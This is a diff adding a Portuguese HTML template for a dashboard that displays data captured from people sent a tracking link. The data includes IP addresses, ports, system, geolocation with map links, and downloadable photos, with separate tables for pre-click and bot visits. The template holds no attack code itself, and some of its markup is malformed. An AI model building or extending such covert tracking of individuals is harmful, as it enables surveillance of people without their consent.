@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Painel de Acessos</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to right, #141e30, #243b55);
+            color: #fff;
+            padding: 40px;
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .table-container {
+            max-height: 400px;
+            overflow-y: auto;
+            margin-bottom: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        th, td {
+            padding: 12px;
+            text-align: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        th {
+            background-color: rgba(0, 184, 148, 0.6);
+            position: sticky;
+            top: 0;
+            z-index: 1;
+        }
+
+        img {
+            border-radius: 6px;
+            box-shadow: 0 0 5px rgba(0,0,0,0.4);
+        }
+
+        tr:hover {
+            background-color: rgba(255, 255, 255, 0.05);
+        }
+
+        .voltar {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #00b894;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 6px;
+            transition: background-color 0.3s;
+        }
+
+        .voltar:hover {
+            background-color: #019875;
+        }
+
+        .mapa-btn {
+            background-color: #0984e3;
+            color: white;
+            padding: 6px 10px;
+            border: none;
+            border-radius: 5px;
+            text-decoration: none;
+            transition: background-color 0.3s;
+        }
+
+        .mapa-btn:hover {
+            background-color: #74b9ff;
+        }
+    </style>
+</head>
+<body>
+    <h2>📊 Registros de captura (Após clicar) </h2>
+    <div class="table-container">
+        <table>
+            <tr>
+                <th>Investigado</th><th>Data/hora</th><<th>IPV6</th><<th>IPV4</th><th>sistema</th>
+                <th>Localização</th><th>Conexão</th><th>porta</th><th><th>Foto</th>
+            </tr>
+            {% for r in registros %}
+            <tr>
+                <td>{{ r.link.nome_investigado if r.link else '---' }}</td>
+                <td>{{ r.data_hora.strftime("%d/%m/%Y %H:%M:%S") }}</td>
+                <td>{{ r.ip_v6}}</td>
+                 <td>{{ r.ip_v4}}</td>
+                <td>{{ r.sistema }}</td>
+                <td>
+                    {{ r.latitude }}, {{ r.longitude }}<br>
+                    {% if r.latitude and r.longitude %}
+                        <a href="https://www.google.com/maps?q={{ r.latitude }},{{ r.longitude }}" 
+                           target="_blank"
+                           style="font-size: 12px; color: #3b82f6; text-decoration: none;">
+                           🗺️ Ver no Mapa
+                        </a>
+                    {% endif %}
+                </td>
+                <td>
+                    <td>{{ r.porta_r }}</td>
+                <td>
+                    <td>
+                        {% if r.foto_arquivo %}
+                            <!-- Exibir a imagem -->
+                            <img src="{{ url_for('static', filename='upload/' + r.foto_arquivo) }}" alt="Foto capturada" style="max-width: 200px;">
+                            
+                            <!-- Botão de download -->
+                            <br>
+                            <a href="{{ url_for('static', filename='upload/' + r.foto_arquivo) }}" download="{{ r.foto_arquivo }}" class="btn-download" style="margin-top: 10px; display: inline-block; text-decoration: none; background-color: #4CAF50; color: white; padding: 5px 10px; border-radius: 5px;">
+                                ⬇️ Baixar Foto
+                            </a>
+                        {% else %}
+                            <p>Sem foto</p>
+                        {% endif %}
+                    </td>
+
+
+                </td>
+            </tr>
+            {% endfor %}
+        </table>
+    </div>
+
+    <h2>📥 IPs Capturados ao Acessar o Link (Antes do Clique)</h2>
+    <div class="table-container">
+        <table>
+            <tr>
+                <th>Investigado</th>
+                <th>Data</th>
+                <th>IP/porta</th>
+            
+            </tr>
+            {% for ip in ips_iniciais %}
+            <tr>
+                <td>{{ links[ip.slug] if ip.slug in links else '---' }}</td>
+                <td>{{ ip.data_hora.strftime("%d/%m/%Y %H:%M:%S") }}</td>
+                <td>
+                    {{ ip.ip_v4 }}<br>
+                    {{ ip.ip_v6 }}<br>
+                    {{ ip.porta }}<br>
+                    <a href="https://ipinfo.io/{{ ip.ip }}" 
+                       target="_blank" 
+                       class="mapa-btn" 
+                       style="margin-top: 5px; display: inline-block;">
+                       🔍 Ver Provedor
+                    </a>
+                </td>
+            </tr>
+            {% endfor %}
+        </table>
+    </div>
+    <h2>🤖 IP Capturado de Bot (Acesso Automático)</h2>
+        <div class="table-container">
+            <table>
+                <tr>
+                    <th>Investigado</th>
+                    <th>Data</th>
+                    <th>IP/Porta</th>
+                </tr>
+                {% for bot in registros_bot %}
+                <tr>
+                    <td>{{ links[bot.slug] if bot.slug in links else '---' }}</td>
+                    <td>{{ bot.timestamp.strftime("%d/%m/%Y %H:%M:%S") }}</td>
+                    <td>
+                        {{ bot.ip }}<br>
+                        {{ bot.porta }}<br>
+                        <a href="https://ipinfo.io/{{ bot.ip }}" 
+                        target="_blank" 
+                        class="mapa-btn" 
+                        style="margin-top: 5px; display: inline-block;">
+                        🔍 Ver Provedor
+                        </a>
+                    </td>
+                </tr>
+                {% endfor %}
+            </table>
+        </div>
+
+    <div style="text-align:center; margin-top: 20px;">
+        <a href="/gerenciar" class="voltar">⬅ Voltar ao Gerenciamento</a>
+    </div>
+</body>
+</html>
